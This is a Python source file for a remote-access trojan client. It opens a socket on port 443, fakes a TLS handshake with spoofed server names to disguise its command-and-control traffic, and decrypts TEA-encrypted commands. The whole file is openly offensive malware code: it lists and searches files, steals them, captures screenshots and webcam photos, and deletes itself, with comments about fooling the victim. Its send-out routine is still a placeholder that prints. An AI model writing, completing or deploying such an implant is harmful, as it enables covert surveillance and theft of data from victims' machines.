import random
import subprocess
from ctypes import c_uint
from socket import *

import cv2
import pyautogui

# TEA based on http://www.cs.sjsu.edu/~stamp/CS265/SecurityEngineering/chapter5_SE/tea
# FakeTLS based on https://medium.com/@raykaryshyn/an-implementation-of-faketls-85b94f496d72

ip = "localhost" # change this IP
port = 443 # HTTPS port to help fool victim

K = [0x77652061, 0x72652072, 0x3373652d, 0x72636821] # TEA key
magic = 0x9e3779b9 # TEA magic constant

def decrypt(ciphertext: list[int]) -> list[int]:
    """
    Returns tuple of ints representing deciphered ciphertext block
    Param ciphertext: tuple of ints representing ciphertext block
    """
    L = c_uint(ciphertext[0]) # L, R, and sum are 32 bit
    R = c_uint(ciphertext[1])
    sum = c_uint(magic)
    sum.value <<= 5
    for x in range(0,32): # 32 rounds are recommended
        R.value -= ((L.value << 4) + K[2]) ^ (L.value + sum.value) ^ ((L.value >> 5) + K[3])
        L.value -= ((R.value << 4) + K[0]) ^ (R.value + sum.value) ^ ((R.value >> 5) + K[1])
        sum.value -= magic
    return [L.value, R.value]

def cbc(ciphertext: bytes) -> str:
    """
    Returns plaintext as string after TEA CBC
    Param ciphertext: bytes representation of ciphertext from server through socket
    """
    bn = int(len(ciphertext) / 8) # number of cipher blocks + 1 for IV
    plain = []
    blocks = []
    for x in range(0,bn): # split received data into blocks, block 0 is the IV
        blocks.append([int.from_bytes(ciphertext[8*x:8*x+4], 'big'), int.from_bytes(ciphertext[8*x+4:8*x+8], 'big')])
    for x in range(1,bn): # decrypt blocks
        prexor = decrypt(blocks[x])
        plain.append([prexor[0] ^ blocks[x-1][0], prexor[1] ^ blocks[x-1][1]]) # xor with previous or IV and add to plaintext list
    out = ""
    for x in range(0,bn-1): # construct plaintext string
        out += plain[x][0].to_bytes(4, 'big').decode() + plain[x][1].to_bytes(4, 'big').decode()
    return out

def parsecmd(enccmd: bytes) -> list[str]:
    """
    Returns parsed command as a tuple of command type and command parameter
    Param enccmd: encoded parameter bytes representation from server through socket
    """
    cmd = cbc(enccmd)
    cmdarr = cmd.split(":") # : is the separator we use in the server
    ct = cmdarr[0] # command type
    if len(cmdarr) > 1:
        cp = cmdarr[1] # command parameter, can be padding if no parameter is given
    else:
        cp = "" # if there is no command parameter and no padding
    return [ct, cp]

def execcmd(cmd: list[str]):
    """
    Calls the function to be executed based on the command
    Param cmd: tuple of command type and command parameter
    """
    ct = cmd[0]
    cp = cmd[1]
    if ct == "ls": # list files
        ls(cp)
    elif ct == "find": # find file
        find(cp)
    elif ct == "get": # exfiltrate file
        get(cp)
    elif ct == "sc": # exfiltrate screenshot
        sc()
    elif ct == "cam": # exfiltrate webcam photo
        cam()
    elif ct == "sd": # self destruct
        sd()
    elif ct == "stat": # exfiltrate echo of command parameter
        exfil(cp.encode())
    else: # exfiltrate failure status
        exfil("failure".encode())

def ls(cp: str):
    """
    Exfiltrates list of files in directory cp
    Param cp: command parameter string is directory path
    """
    if cp == "":
        path = "/"
    else:
        path = cp
    process = subprocess.run(["ls", cp], capture_output=True)
    exfil(process.stdout)

def find(cp: str):
    """
    Exfiltrates list of files containing string cp
    Param cp: command parameter string is target
    """
    process = subprocess.run(["find", "/"], capture_output=True)
    fs = process.stdout.decode().split("\n")
    out = ""
    for file in fs:
        if cp in file:
            out += file + "\n"
    exfil(out.encode())

def get(cp: str):
    """
    Exfiltrates file with path cp
    Param cp: command parameter string is path of target file
    """
    file = open(cp, "rb")
    contents = file.read()
    exfil(contents)

def sc():
    """
    Exfiltrates screenshot
    """
    exfil(pyautogui.screenshot().tobytes())

def cam():
    """
    Exfiltrates webcame photo
    """
    vid = cv2.VideoCapture(0) # begin video recording through webcam
    exfil(cv2.imencode('.jpg', vid.read()[1])[1].tobytes()) # exfiltrate still frame
    vid.release() # stop video recording through webcam

def sd():
    """
    Exfiltrates self destruct status and then deletes this file
    """
    exfil("self destruct") # exfiltrate self destruct status
    subprocess.run(["rm", __file__])

def exfil(info: bytes): # TODO
    print(info)

def makehello() -> bytes:
    """
    Returns bytes of TLS client hello
    """
    servernames = [
        "www.mitre.org", "www.amazon.com",
        "www.avast.com", "www.apple.com",
        "www.bing.com", "www.dell.com",
        "www.avira.com", "www.microsoft.com",
        "www.linkedin.com", "www.paypal.com",
        "www.google.com", "www.yahoo.com",
        "www.wikipedia.com", "www.wordpress.com"
    ]
    random.seed()
    servname = servernames[random.randint(0,13)].encode() # a random server name is chosen
    servname_s = len(servname)

    extserv_pre = bytes([
        0x00, 0x00, # server name extension
        0x00, servname_s + 5, # number of bytes of server name extension follows
        0x00, servname_s + 3, # number of bytes of list entry follows
        0x00, # list entry type = DNS hostname
        0x00, servname_s # number of bytes of hostname follows
    ])

    extserv = extserv_pre + servname # extension - server name

    extoth_p1 = bytes([
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
        0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e,
        0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02,
        0x01, 0x03, 0x01, 0x04, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16,
        0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x1e,
        0x00, 0x1c, 0x04, 0x03, 0x05, 0x03, 0x06, 0x03, 0x08, 0x07,
        0x08, 0x08, 0x08, 0x09, 0x08, 0x0a, 0x08, 0x0b, 0x08, 0x04,
        0x08, 0x05, 0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01,
        0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04, 0x00, 0x2d, 0x00,
        0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00,
        0x1d, 0x00, 0x20
    ])
    extoth_p2 = random.randbytes(32)
    extoth = extoth_p1 + extoth_p2 # remainder of extensions, we fill it with stock and random info

    ext = extserv + extoth # extensions

    cvel_r1 = random.randbytes(32) # client random: random data to be used later in a normal TLS session
    cvel_r2 = random.randbytes(32) # made up session ID
    
    cvel_p1 = bytes([0x03, 0x03]) # client version TLS 1.2 for interoperability, we are actually spoofing TLS 1.3
    cvel_p2 = bytes([0x20]) # 0x20 bytes of session ID data follows
    cvel_p3 = bytes([
        0x00, 0x08, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, # cipher suites: we lie about supported encryption
        0x01, 0x00, 0x00, len(ext) # compression is null and extension length
    ])
    cvel = cvel_p1 + cvel_r1 + cvel_p2 + cvel_r2 + cvel_p3

    cvrest = cvel + ext # non-header data in our hello packet
    cvrest_s = len(cvrest)

    top = bytes([ # header of hello
        0x16, 0x03, # record header
        0x01, 0x00,
        cvrest_s + 4,
        0x01, 0x00, 0x00, # handshake header
        cvrest_s
    ])

    clihel = top + cvrest # header + data -> hello
    return clihel

def sendhello(clientSocket):
    """
    Sends fake TLS client hello to server
    """
    clihel = makehello()
    clientSocket.send(clihel)

def sendhellofin(clientSocket):
    """
    Sends client handshake finished to server
    """
    clihelfin_p1 = bytes([ #
        0x14, 0x03, 0x03, 0x00, 0x01, 0x01, # client change header spec
        0x17, 0x03, 0x03, 0x00, 0x45 # wrapped record - record header
    ])
    clihelfin_p2 = random.randbytes(69) # random bytes to mimic encrypted data and auth tag
    clihelfin = clihelfin_p1 + clihelfin_p2 # client handshake finished

    clientSocket.send(clihelfin)

def main():
    """
    Connects to server with FakeTLS handshake, then waits for commands and executes them
    """
    clientSocket = socket(AF_INET, SOCK_STREAM)
    try:
        clientSocket.connect((ip, port))
    except: # connection failure - should only happen if server is not running
        return 1
    sendhello(clientSocket) # FakeTLS client hello is sent
    clientSocket.recv(2048) # server reply is received and discarded
    sendhellofin(clientSocket) # FakeTLS client handshake finished is sent

    while True: # execute command loop
        message = clientSocket.recv(2048) # receive command
        command = parsecmd(message) # parse command
        execcmd(command) # execute command including exfiltration

if __name__ == "__main__":
    main()
